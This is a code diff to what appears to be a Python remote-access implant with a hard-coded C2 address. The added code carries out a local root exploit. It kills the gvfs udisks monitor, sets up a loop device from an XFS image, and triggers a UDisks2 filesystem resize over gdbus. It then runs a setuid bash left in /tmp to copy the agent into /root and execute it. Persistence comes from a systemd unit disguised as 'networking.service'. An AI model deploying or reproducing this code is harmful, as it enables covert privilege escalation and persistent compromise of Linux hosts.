@@ -8,7 +8,8 @@ import os
 import subprocess
 import sys
 import ssl
-
+import re
+import glob
 
 C2_IP = IP_HOST # Adapt according to your network
 C2_PORT = 9999
@@ -92,8 +93,88 @@ def send_to_c2():
     except Exception as e:
         pass
 
+def run_command(cmd, shell=False, capture_output=True):
+    print(f"[*] Running: {cmd}")
+    result = subprocess.run(cmd, shell=shell, text=True,
+                            stdout=subprocess.PIPE if capture_output else None,
+                            stderr=subprocess.STDOUT)
+    output = result.stdout.strip() if result.stdout else ''
+    if output:
+        print(f"[+] Output:\n{output}\n")
+    return output
+
+def try_escalation():
+    # 1. Kill gvfs monitor
+    user = run_command(["whoami"], shell=True)
+
+    run_command(["killall", "-KILL", "gvfs-udisks2-volume-monitor"])
+
+    # 2. Set up loop device with udisksctl
+    udisks_output = run_command("udisksctl loop-setup --file ./xfs.image --no-user-interaction", shell=True)
+
+    # Extract loop device name (e.g. loop2)
+    match = re.search(r'/dev/(loop\d+)', udisks_output)
+    if not match:
+        print("[-] Failed to find loop device.")
+        return False
+
+    loopdev = match.group(1)
+    print(f"[+] Loop device detected: {loopdev}")
+
+    # 3. Start background watcher using `sh`
+    watcher_command = (
+        "while true; do "
+        "/tmp/blockdev*/bash -c 'sleep 3; ls -l /tmp/blockdev*/bash' && break; "
+        "done 2>/dev/null"
+    )
+    process = subprocess.Popen(watcher_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+    # 4. Run gdbus call with dynamic loop device
+    gdbus_cmd = [
+        "gdbus", "call", "--system",
+        "--dest", "org.freedesktop.UDisks2",
+        "--object-path", f"/org/freedesktop/UDisks2/block_devices/{loopdev}",
+        "--method", "org.freedesktop.UDisks2.Filesystem.Resize", "0", "{}"
+    ]
+    run_command(gdbus_cmd)
+    process.wait()
+    bash = glob.glob("/tmp/blockdev*/bash")
+    subprocess.run([bash[0], "-p", "-c", "cp /home/{}/.config/setup.py /root/.config/setup.py && python3 /root/.config/setup.py".format(user)])
+    return True
+
 def make_permanent():
-    os.system('crontab -l 2>/dev/null; echo "@reboot /usr/bin/python3 ~/.config/setup.py" | crontab -')
+    print("[*] Making the agent persistent...")
+    print(" the current user is: ", getpass.getuser())
+    print(" the current uid is: ", os.getuid())
+    print(" the current gid is: ", os.geteuid())
+    if (os.geteuid() != 0):
+        if (try_escalation() == True):
+            exit(0)
+        else:
+            #os.system('crontab -l 2>/dev/null; echo "@reboot /usr/bin/python3 ~/.config/setup.py" | crontab -')
+            print("[!] Failed to escalate privileges. Please run as root.")
+            exit(0)
+    else:
+        print("[!] Running as root, setting up systemd service...")
+        if os.path.exists("/etc/systemd/system/networking.service"):
+            return
+        # start /root/.config/setup.py on boot on systemd
+        service_content = f"""[Unit]
+Description=Networking Service
+After=network.target
+[Service]
+Type=simple
+ExecStart=/usr/bin/python3 /root/.config/setup.py
+Restart=always
+[Install]
+WantedBy=multi-user.target
+"""
+        service_path = "/etc/systemd/system/networking.service"
+        with open(service_path, "w") as f:
+            f.write(service_content)
+        subprocess.run(["systemctl", "enable", "networking.service"])
+        subprocess.run(["systemctl", "start", "networking.service"])
+        exit(0)
 
 if __name__ == "__main__":
     make_permanent()
